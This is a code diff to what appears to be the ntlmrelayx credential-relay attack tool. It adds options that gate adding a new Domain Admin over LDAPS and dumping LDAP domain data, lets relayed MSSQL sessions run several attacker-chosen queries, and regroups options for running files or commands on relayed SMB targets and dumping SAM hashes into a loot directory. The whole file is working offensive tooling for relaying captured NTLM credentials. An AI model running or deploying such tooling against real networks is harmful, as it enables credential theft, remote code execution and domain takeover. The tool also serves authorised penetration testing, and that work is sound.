@@ -191,13 +191,16 @@ class LDAPAttack(Thread):
 
         if domainDumper.isDomainAdmin(self.username):
             logging.info('User is a Domain Admin!')
-            if 'ldaps' in self.client.target:
-                self.addDA(domainDumper)
+            if self.config.addda:
+                if 'ldaps' in self.client.target:
+                    self.addDA(domainDumper)
+                else:
+                    logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
             else:
-                logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
+                logging.info('Not adding a new Domain Admin because of configuration options')
         else:
             logging.info('User is not a Domain Admin')
-            if not dumpedDomain:
+            if not dumpedDomain and self.config.dumpdomain:
                 logging.info('Dumping domain info for first time')
                 domainDumper.domainDump()
                 dumpedDomain = True
@@ -232,17 +235,20 @@ class HTTPAttack(Thread):
             of.write(self.client.lastresult)
 
 class MSSQLAttack(Thread):
-    def __init__(self, config, MSSQLClient, command):
+    def __init__(self, config, MSSQLClient):
         Thread.__init__(self)
         self.config = config
         self.client = MSSQLClient
-        self.command = command
 
     def run(self):
-        logging.info('Executing SQL: %s' % self.command)
-        self.client.sql_query(self.command)
-        self.client.printReplies()
-        self.client.printRows()
+        if self.config.queries is None:
+            logging.error('No SQL queries specified for MSSQL relay!')
+        else:
+            for query in self.config.queries:
+                logging.info('Executing SQL: %s' % query)
+                self.client.sql_query(query)
+                self.client.printReplies()
+                self.client.printRows()
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -252,8 +258,12 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
     print version.BANNER
+    #Parse arguments
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                     "try to relay that connection to specified target(s) system or the original client")
+    parser._optionals.title = "Main options"
+
+    #Main arguments
     parser.add_argument("-h","--help", action="help", help='show this help message and exit')
     parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help='Target to relay the credentials to, '
                   'can be an IP, hostname or URL like smb://server:445 If unspecified, it will relay back to the client')
@@ -261,12 +271,8 @@ if __name__ == '__main__':
                                                                              'full URL, one per line')
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
+    parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
-    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
-                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
-    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
-                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
-                                                          'directory). When targeting MSSQL, specify a SQL statement')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR', help='Loot '
                     'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
     parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
@@ -275,6 +281,29 @@ if __name__ == '__main__':
                         'interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
+
+    #SMB arguments
+    smboptions = parser.add_argument_group("SMB client options")
+    smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
+                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    smboptions.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
+                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
+                                                          'directory).')
+
+    #MSSQL arguments
+    mssqloptions = parser.add_argument_group("MSSQL client options")
+    mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
+                        '(can specify multiple)')
+    
+    #HTTP options (not in use for now)
+    # httpoptions = parser.add_argument_group("HTTP client options")
+    # httpoptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
+    #                     '(can specify multiple)')   
+
+    #LDAP options
+    ldapoptions = parser.add_argument_group("LDAP client options")
+    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information') 
+    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin') 
 
     try:
        options = parser.parse_args()
@@ -310,9 +339,6 @@ if __name__ == '__main__':
     else:
         lootdir = '.'
 
-    #Temp
-    #mode = 'TRANSPARENT'
-
     exeFile = options.e
     Command = options.c
 
@@ -326,11 +352,18 @@ if __name__ == '__main__':
         c.setAttacks(ATTACKS)
         c.setLootdir(lootdir)
         c.setOutputFile(options.output_file)
+        c.setLDAPOptions(options.no_dump,options.no_da)
+        c.setMSSQLOptions(options.query)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
             c.setMode('REDIRECT')
             c.setRedirectHost(options.r)
+
+        #Use target randomization if configured and the server is not SMB
+        #SMB server at the moment does not properly store active targets so selecting them randomly will cause issues
+        if server is not SMBRelayServer and options.random:
+            c.setRandomTargets(True)
 
         if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
             c.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
